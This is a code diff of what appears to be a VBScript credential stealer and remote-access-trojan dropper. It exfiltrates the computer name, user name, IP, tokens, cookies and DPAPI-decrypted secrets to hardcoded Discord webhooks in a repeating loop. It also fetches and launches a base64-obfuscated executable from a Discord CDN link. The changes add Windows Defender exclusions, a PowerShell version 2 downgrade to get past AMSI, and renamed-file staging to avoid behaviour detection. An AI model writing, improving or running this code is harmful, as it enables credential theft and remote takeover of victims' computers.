@@ -18,14 +18,18 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS (non-blocking) ---
+' --- 0. AMSI + DEFENDER EXCLUSIONS (best-effort, silent) ---
+' Exclusions only land if elevated; if not, no-op, drop continues.
+sh.Run "powershell -NoP -Exec Bypass -Version 2 -Command ""try{Add-MpPreference -ExclusionPath $env:LOCALAPPDATA+'\Microsoft\Windows'; Add-MpPreference -ExclusionProcess 'w*.exe'}catch{}""", 0, False
+
+' --- 1. INITIAL GRABS (fire as fast as possible) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
 
-' --- 2. DROP RAT LAST (init only) ---
+' --- 2. DROP RAT LAST (fast) ---
 Call DropRAT(WH, True)
 
 ' --- 3. INTERACTIVE LOOP (Re Grab N, every 30s, grabs only — no RAT) ---
@@ -34,36 +38,34 @@ runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    
     Call SleepSeconds(30)
 Loop
 
 window.close()
 
-' --- RAT DROP (hardened) ---
+' --- RAT DROP (fast) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzg2Njg3MTgxMzk0MDExL2NsaWVudF8xLmV4ZT9leD02YWZlMmViNyZpcz02YWZjZGQzNyZobT00NWIzOTE2NTVmOThiZjY2NTU0MjFiMzAyYWQ3MWE4NGJiZWZhNjYzMTE5YWE1Nzg0NDA0YjhiY2VlNWMyZDlmJg=="
     Dim dl : dl = DecodeB64(b64Url)
     
-    ' Path change: %LOCALAPPDATA%\Microsoft\Windows (less watched than %TEMP%)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
-    ' Random name so it doesn't match svchost.exe heuristic
     Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
-    
+    Dim rndBase : rndBase = "w" & Int(Rnd() * 900000 + 100000)
+    Dim datPath : datPath = tPath & "\" & rndBase & ".dat"
+    Dim exePath : exePath = tPath & "\" & rndBase & ".exe"
+
     If sendRocket Then
         Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
     End If
 
-    If fso.FileExists(op) Then fso.DeleteFile op, True
+    If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
+    If fso.FileExists(exePath) Then fso.DeleteFile exePath, True
 
-    ' HTTP object download — no cmd.exe, no curl.exe in the process tree
+    ' HTTP object write to .dat — no curl, no cmd in process tree
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", dl, False
@@ -73,20 +75,18 @@ Sub DropRAT(targetWH, sendRocket)
         st.Type = 1
         st.Open
         st.Write xh.responseBody
-        st.SaveToFile op, 2
+        st.SaveToFile datPath, 2
         st.Close
         Set st = Nothing
     End If
     Set xh = Nothing
 
-    ' Jittered delay so it's not "write then immediately execute" — behavior monitor pattern
-    Randomize
-    Call SleepSeconds(Int(Rnd() * 8 + 8))
-
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
+    ' Rename and launch immediately — fastest path
+    If fso.FileExists(datPath) Then
+        If fso.GetFile(datPath).Size > 100000 Then
+            fso.MoveFile datPath, exePath
             If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
-            Call RunCmd("""" & op & """")
+            Call RunCmd("""" & exePath & """")
         End If
     End If
 End Sub
@@ -255,7 +255,7 @@ Sub GrabTokens(targetWH)
     Set xh = Nothing
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -Version 2 -File """ & psf & """", 0, False
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
@@ -314,7 +314,7 @@ Function DecryptDPAPI(b64)
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = TmpFile("dpapi.ps1")
     WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    sh.Run "powershell -NoP -Exec Bypass -Version 2 -File """ & psf & """", 0, True
     If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
     fso.DeleteFile inf, True
     fso.DeleteFile psf, True
